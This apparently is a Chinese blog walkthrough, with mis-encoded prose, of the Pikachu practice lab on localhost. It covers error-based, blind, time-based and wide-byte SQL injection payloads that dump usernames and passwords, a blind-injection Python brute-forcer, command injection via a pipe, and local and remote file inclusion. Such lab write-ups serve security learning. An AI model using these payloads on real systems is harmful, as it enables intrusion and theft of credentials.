<h2 id="insert-updataæ³¨å…¥"><a href="#insert-updataæ³¨å…¥" class="headerlink" title="insert/updataæ³¨å…¥"></a>insert/updataæ³¨å…¥</h2><p>æ’å…¥å’Œæ›´æ–°æ—¶çš„æ³¨å…¥å°±éœ€è¦ç”¨burp suiteæ¥æŠ“åŒ…äº†<br>è¿™é‡Œä½¿ç”¨æŠ¥é”™æ³¨å…¥</p>
<h3 id="å¼•å…¥updatexmlå‡½æ•°"><a href="#å¼•å…¥updatexmlå‡½æ•°" class="headerlink" title="å¼•å…¥updatexmlå‡½æ•°"></a>å¼•å…¥updatexmlå‡½æ•°</h3><h4 id="å‡½æ•°è§£é‡Šï¼š"><a href="#å‡½æ•°è§£é‡Šï¼š" class="headerlink" title="å‡½æ•°è§£é‡Šï¼š"></a>å‡½æ•°è§£é‡Šï¼š</h4><p>UPDATEXML (XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£Xpathè¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®<br>ä½œç”¨ï¼šæ­¤å‡½æ•°ç”¨æ¥æ›´æ–°é€‰å®šXMLç‰‡æ®µçš„å†…å®¹ï¼Œå°†XMLæ ‡è®°çš„ç»™å®šç‰‡æ®µçš„å•ä¸ªéƒ¨åˆ†æ›¿æ¢ä¸º <em>xml_target</em> æ–°çš„XMLç‰‡æ®µ <em>new_xml</em> ï¼Œç„¶åè¿”å›æ›´       æ”¹çš„XMLã€‚<em>xml_target</em>æ›¿æ¢çš„éƒ¨åˆ† ä¸<em>xpath_expr</em> ç”¨æˆ·æä¾›çš„XPathè¡¨è¾¾å¼åŒ¹é…ã€‚å¦‚æœæœª<em>xpath_expr</em>æ‰¾åˆ°è¡¨è¾¾å¼åŒ¹é… ï¼Œæˆ–è€…æ‰¾åˆ°å¤šä¸ªåŒ¹é…é¡¹ï¼Œåˆ™è¯¥å‡½æ•°è¿”å›åŸå§‹ <em>xml_target</em>XMLç‰‡æ®µã€‚</p>
<h4 id="æŠ¥é”™åŸç†"><a href="#æŠ¥é”™åŸç†" class="headerlink" title="æŠ¥é”™åŸç†"></a>æŠ¥é”™åŸç†</h4><p>è¿™é‡Œå’Œextractvalueå‡½æ•°ä¸€æ ·ï¼Œå½“Xpathè·¯å¾„è¯­æ³•é”™è¯¯æ—¶ï¼Œå°±ä¼šæŠ¥é”™ï¼ŒæŠ¥é”™å†…å®¹å«æœ‰é”™è¯¯çš„è·¯å¾„å†…å®¹ã€‚</p>
<h4 id="çº¦æŸæ¡ä»¶"><a href="#çº¦æŸæ¡ä»¶" class="headerlink" title="çº¦æŸæ¡ä»¶"></a>çº¦æŸæ¡ä»¶</h4><p> è¾“å‡ºå­—ç¬¦é•¿åº¦é™åˆ¶ä¸º32ä¸ªå­—ç¬¦</p>
<h4 id="æ³¨å…¥è¯­å¥"><a href="#æ³¨å…¥è¯­å¥" class="headerlink" title="æ³¨å…¥è¯­å¥"></a>æ³¨å…¥è¯­å¥</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(ä»£ç ),<span class="number">0x7e</span>),<span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<h4 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h4><p>ç”¨bpæŠ“åŒ…</p>
<p>çˆ†æ•°æ®åº“å</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,database()),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210201163855544.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†è¡¨å</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/2021020212182937.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">å‘ç°æ˜¾ç¤ºä¸å®Œå…¨ï¼Œå‘ƒï¼Œè¶…å‡ºé•¿åº¦äº†<br>å°è¯•ç”¨leftï¼Œmidï¼Œrightæ¥è¿›è¡Œåˆ†æ®µæ˜¾ç¤ºï¼Œå°†å¾—åˆ°çš„ä¿¡æ¯è¿›è¡Œæ‹¼æ¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>pikachu<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122232643.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/2021020212231394.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122335881.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">åˆ†æˆä¸‰æ®µæ˜¾ç¤ºå°±å¯ä»¥çœ‹åˆ°å…¨éƒ¨å†…å®¹äº†</p>
<p>çˆ†å­—æ®µ</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,mid((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,right((select group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122514314.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122547898.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202122631148.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥çˆ†æ•°æ®</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,(select group_concat(username) from users),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br><span class="line"></span><br><span class="line">username<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; or updatexml(&#x27;</span><span class="operator">~</span><span class="string">&#x27;,concat(0x7e,left((select group_concat(password) from users),32),0x7e),&#x27;</span><span class="operator">~</span><span class="string">&#x27;)or&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202122755777.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202123018270.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="deleteæ³¨å…¥"><a href="#deleteæ³¨å…¥" class="headerlink" title="deleteæ³¨å…¥"></a>deleteæ³¨å…¥</h2><p><img src="https://img-blog.csdnimg.cn/20210202123224348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»åˆ é™¤å¹¶æŠ“åŒ…çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/2021020212370529.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p>åœ¨idå¤„è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">56</span><span class="operator">%</span><span class="number">20</span><span class="keyword">or</span><span class="operator">%</span><span class="number">20</span>updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,database()),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202123943418.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥å°±å’Œä¸Šè¾¹å¤§åŒå°å¼‚äº†ï¼Œå°±ä¸å¤šå†™äº†</p>
<h2 id="http-headeræ³¨å…¥"><a href="#http-headeræ³¨å…¥" class="headerlink" title="http headeræ³¨å…¥"></a>http headeræ³¨å…¥</h2><p><a href="http://t0mrvvi1b3t.top/2021/04/29/http/">å…³äºhttpå¤´</a></p>
<h3 id="åœ¨User-Agentå¤„æ³¨å…¥"><a href="#åœ¨User-Agentå¤„æ³¨å…¥" class="headerlink" title="åœ¨User-Agentå¤„æ³¨å…¥"></a>åœ¨User-Agentå¤„æ³¨å…¥</h3><p>å…ˆéšä¾¿ç™»é™†ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/20210202135551902.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><img src="https://img-blog.csdnimg.cn/20210202135656799.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/20210202135734904.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">çˆ†æ•°æ®åº“</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: Mozilla<span class="string">&#x27; or updatexml(1,concat(0x7e,database ()),0) or &#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202135818376.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">æ¥ä¸‹æ¥å°±å’Œä¹‹å‰çš„å·®ä¸å¤šä¸€æ ·äº†ï¼Œè‡ªå·±æ“ä½œå°±è¡Œäº†</p>
<h3 id="åœ¨Cookieå¤„æ³¨å…¥"><a href="#åœ¨Cookieå¤„æ³¨å…¥" class="headerlink" title="åœ¨Cookieå¤„æ³¨å…¥"></a>åœ¨Cookieå¤„æ³¨å…¥</h3><p>è¿˜æ˜¯ä¸€æ ·çš„æ“ä½œå°†ç¬¬äºŒä¸ªåŒ…å‘é€åˆ°repeater<br><img src="https://img-blog.csdnimg.cn/20210202140258556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">æ„é€ è¯­å¥ï¼š<span class="string">&#x27;and updatexml (1,concat(0x7e,database()),0)#</span></span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210202140353275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDU5Nzk2OQ==,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°">è¿™æ ·ä¹Ÿå¯ä»¥çˆ†å‡ºæ•°æ®åº“å</p>
<h2 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h2><p>è¯­å¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kobe&#39; and ascii(substr(database(),1,1))&#x3D;112#</span><br></pre></td></tr></table></figure>

<p>æœ‰å…³å‡½æ•°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">length()å‡½æ•°çš„ä½œç”¨æ˜¯è¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½ã€‚ä¸€ä¸ªå¤šå­—èŠ‚å­—ç¬¦ç®—ä½œå¤šå­—èŠ‚ã€‚è¿™æ„å‘³ç€ï¼Œå¯¹äºåŒ…å«å››ä¸ªä¸¤å­—èŠ‚å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œlength() è¿”å›8,  è€Œ char_length() è¿”å› 4</span><br><span class="line"></span><br><span class="line">length(&#39;text&#39;)è¿”å›å€¼ä¸º4</span><br><span class="line"></span><br><span class="line">substr()å‡½æ•°ä»ç‰¹å®šä½ç½®å¼€å§‹çš„å­—ç¬¦ä¸²è¿”å›ä¸€ä¸ªç»™å®šé•¿åº¦çš„å­å­—ç¬¦ä¸²</span><br><span class="line">substr()å‡½æ•°æœ‰ä¸‰ä¸ªå‚æ•°ï¼Œç”¨æ³•ä¸ºï¼šsubstr(str,pos,len)</span><br><span class="line">strå‚æ•°ä»£è¡¨å¾…æˆªå–çš„å­—ç¬¦ä¸²</span><br><span class="line">poså‚æ•°ä»£è¡¨ä»ä»€ä¹ˆä½ç½®å¼€å§‹æˆªå–</span><br><span class="line">lenå‚æ•°è¡¨ç¤ºå­—ç¬¦ä¸²æˆªå–çš„é•¿åº¦</span><br><span class="line"></span><br><span class="line">ascii()å‡½æ•°å¯ä»¥è¾“å‡ºæŸä¸ªå­—ç¬¦çš„asciiç å€¼ï¼Œasciiç å…±127ä¸ªï¼Œæ­¤å¤„æ³¨æ„asciiå‡½æ•°å¤„ç†å•ä¸ªå­—ç¬¦ï¼Œå¦‚æœæ˜¯å­—ç¬¦ä¸²åˆ™ä¼šå¤„ç†ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>åŸç†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">æ— æ³•ä½¿ç”¨unionæ¥ç›´æ¥æŸ¥è¯¢æ—¶ï¼Œéœ€è¦ç”¨åˆ°å…³é”®å­—andï¼Œåªæœ‰andå‰åçš„æ¡ä»¶éƒ½ä¸ºçœŸçš„æ—¶å€™ï¼Œæ•°æ®åº“æ‰ä¼šè¾“å‡ºç»“æœã€‚ å°†è¿”å›å­—ç¬¦ä¸²çš„asciiä¸æ³¨å…¥è¯­å¥çš„asciiè¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰æ—¶æ‰ä¼šè¿”å›æ­£å¸¸çš„é¡µé¢ï¼Œåˆ©ç”¨è¿™ä¸ªè¿›è¡Œçˆ†ç ´å³å¯</span><br></pre></td></tr></table></figure>

<p>å¯ä½¿ç”¨bpè¿›è¡Œçˆ†ç ´ä¹Ÿå¯å†™pythonè„šæœ¬</p>
<p><del>ç»è¿‡å‡ ä¸ªå°æ—¶çš„å¥‹æˆ˜ï¼Œç»ˆäºæ•´å®Œäº†pythonè„šæœ¬ hahahah</del></p>
<p>çˆ†ç ´æ•°æ®åº“çš„pythonè„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url1=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe%s&amp;submit=æŸ¥è¯¢&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://127.0.0.1/pikachu/vul/sqli/sqli_blind_b.php?name=kobe&amp;submit=æŸ¥è¯¢&quot;</span></span><br><span class="line">payload=<span class="string">&quot;%27+and+ascii%28substr%28database%28%29%2C&#123;0&#125;%2C1%29%29%3D&#123;1&#125;%23&quot;</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Start to retrive the database&quot;</span>)</span><br><span class="line">b=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">8</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        p=payload.<span class="built_in">format</span>(i,j)</span><br><span class="line">        url=url1 % p</span><br><span class="line">        r=((requests.get(url)).text).find(<span class="string">&#x27;pikachu.com&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> r==<span class="number">31550</span>:</span><br><span class="line">        	b=j</span><br><span class="line">    database+=<span class="built_in">chr</span>(b)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;the database is :%s&quot;</span> % database)</span><br></pre></td></tr></table></figure>



<h2 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h2><p>éƒ½ä¸ºç›²æ³¨ï¼Œåˆ©ç”¨sleepå‡½æ•°è®¾å®šä¸€ä¸ªæ—¶é•¿ï¼Œé€šè¿‡é¡µé¢çš„ååº”æ—¶é—´æ¥åˆ¤æ–­æ³¨å…¥è¯­å¥çš„asciiä¸å¯¹åº”å­—ç¬¦æ˜¯å¦ç›¸ç­‰</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¾‹</span><br><span class="line">kobeâ€™ and sleep(5)#</span><br><span class="line">kobe&#39; and if ((substr(database(),1,1))&#x3D;&#39;a&#39;,sleep&#x3D;(5),null)#</span><br><span class="line">1mså°±è¿”å›ç»“æœ è¯´æ˜ä¸æ˜¯ &quot;a&quot;ä¸€ç›´çˆ†ç ´åˆ°ç¡®å®šæ•°æ®åº“çš„å…¨ç§°</span><br></pre></td></tr></table></figure>

<p>æ³¨å…¥ä¹‹å‰å¯ä»¥å…ˆæµ‹è¯•<code>kobeâ€™ and sleep(5)#</code>è‹¥ç¡®å®æ˜¯5sä¹‹åé¡µé¢åˆ·æ–°åˆ™å­˜åœ¨æ—¶é—´ç›²æ³¨</p>
<h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>æŠ“åŒ…ä¿®æ”¹æ•°æ®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ä¿®æ”¹nameå€¼ä¸ºkobe%df&#39; or 1&#x3D;1#</span><br></pre></td></tr></table></figure>

<p><img src="https://img.vim-cn.com/e6/846df244abcc61f41fcda33e1097feb2752b00.png"></p>
<p>å¾—åˆ°å›æ˜¾</p>
<p><img src="https://img.vim-cn.com/cb/074c06446545c30e8107f592c961b403bdcbad.png"></p>
<p>è¯´æ˜å­˜åœ¨æ³¨å…¥</p>
<h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><p><a href="http://t0mrvvi1b3t.top/2021/04/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">å…³äºrce</a></p>
<h2 id="exec-â€œpingâ€"><a href="#exec-â€œpingâ€" class="headerlink" title="exec â€œpingâ€"></a>exec â€œpingâ€</h2><p><img src="https://img.vim-cn.com/2f/e10a700d174e68246d8443bf9c4be7b63fb42d.png"></p>
<p>åˆ©ç”¨ç®¡é“ç¬¦æ‹¼æ¥å‘½ä»¤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1|whoami</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥è¿”å›ç”µè„‘çš„ç”¨æˆ·å</p>
<h2 id="exec-â€œevalâ€"><a href="#exec-â€œevalâ€" class="headerlink" title="exec â€œevalâ€"></a>exec â€œevalâ€</h2><p><img src="https://img.vim-cn.com/25/f221d66f3518ab84707179f7bfdf293230fb8e.png"></p>
<p><a href="https://www.php.net/eval">å…³äºevalå‡½æ•°</a></p>
<p>æ‰§è¡Œä»£ç  payloadï¼š<code>phpinfo();</code></p>
<p>å³å¯çœ‹åˆ°phpinfo</p>
<h1 id="File-inclusion-æ–‡ä»¶åŒ…å«"><a href="#File-inclusion-æ–‡ä»¶åŒ…å«" class="headerlink" title="File inclusion( æ–‡ä»¶åŒ…å« )"></a>File inclusion( æ–‡ä»¶åŒ…å« )</h1><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚                        ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ”»å‡»è€…ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚</p>
<h2 id="File-inclusion-local"><a href="#File-inclusion-local" class="headerlink" title="File inclusion( local )"></a>File inclusion( local )</h2><p>æœ¬åœ°åŒ…å«</p>
<p>éšä¾¿é€‰æ‹©ä¸€ä¸ª</p>
<p><img src="https://img.vim-cn.com/8a/eb86b177acced6faa3b3d14f7ccf91e0815916.png"></p>
<p>è§‚å¯Ÿurl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_local.php?filename&#x3D;file1.php&amp;submit&#x3D;æäº¤æŸ¥è¯¢</span><br></pre></td></tr></table></figure>

<p>åœ¨æœ¬åœ°æ–‡ä»¶å¤¹å†™å†™ä¸€ä¸ª1.txtæ–‡æœ¬</p>
<p><img src="https://img.vim-cn.com/a4/dfc3100b6040eba1e2fbf2ad914076a094f1a5.png"></p>
<p>ä¿®æ”¹url</p>
<p><img src="https://img.vim-cn.com/35/ffdad9528c963cca07f828a16704aa51afa791.png"></p>
<p>æˆåŠŸåŒ…å«</p>
<p>æºç ğŸ‘‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]!=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;include/<span class="subst">$filename</span>&quot;</span>;<span class="comment">//å˜é‡ä¼ è¿›æ¥ç›´æ¥åŒ…å«,æ²¡åšä»»ä½•çš„å®‰å…¨é™åˆ¶</span></span><br><span class="line"><span class="comment">//     //å®‰å…¨çš„å†™æ³•,ä½¿ç”¨ç™½åå•ï¼Œä¸¥æ ¼æŒ‡å®šåŒ…å«çš„æ–‡ä»¶å</span></span><br><span class="line"><span class="comment">//     if($filename==&#x27;file1.php&#x27; || $filename==&#x27;file2.php&#x27; || $filename==&#x27;file3.php&#x27; || $filename==&#x27;file4.php&#x27; || $filename==&#x27;file5.php&#x27;)&#123;</span></span><br><span class="line"><span class="comment">//         include &quot;include/$filename&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="File-inclusion-remote"><a href="#File-inclusion-remote" class="headerlink" title="File inclusion( remote )"></a>File inclusion( remote )</h2><p><img src="https://img.vim-cn.com/ef/2b63aa1cb083610b4a05bf84c85021c7e979cf.png"></p>
<p>æ‰¾åˆ°æœ¬æœºçš„php.iniä¿®æ”¹é…ç½®æ–‡ä»¶</p>
<p><img src="https://img.vim-cn.com/1a/9453be568c4b11e4d04f2f942105bb16d03067.png"></p>
<p>åˆ©ç”¨kaliåšè¿œç¨‹ä¸»æœºï¼Œåœ¨/var/www/htmlæ–‡ä»¶å¤¹å†…å†™å…¥1.php</p>
<p><img src="https://img.vim-cn.com/5b/f089c4d6ee18432e87161990dab433cbe10007.png"></p>
<p>å¼€å¯apacheæœåŠ¡</p>
<p><img src="https://img.vim-cn.com/66/fb8e9954c00922faad0ae9df4ffe0a79be1c14.png"></p>
<p>ä¿®æ”¹filenameçš„å€¼ä¸º<a href="http://ip/%E6%96%87%E4%BB%B6%E5%90%8D%E5%8D%B3%E5%8F%AF">http://ip/æ–‡ä»¶åå³å¯</a></p>
<h1 id="Unsafe-filedownload"><a href="#Unsafe-filedownload" class="headerlink" title="Unsafe filedownload"></a>Unsafe filedownload</h1><p>ç‚¹å‡»ä¸‹è½½ï¼Œç”¨bpæŠ“åŒ…ä¿®æ”¹æ•°æ®</p>
<p><img src="https://img.vim-cn.com/09/0e319baa1d8be2cb753b55efbe769b1043f777.png"></p>
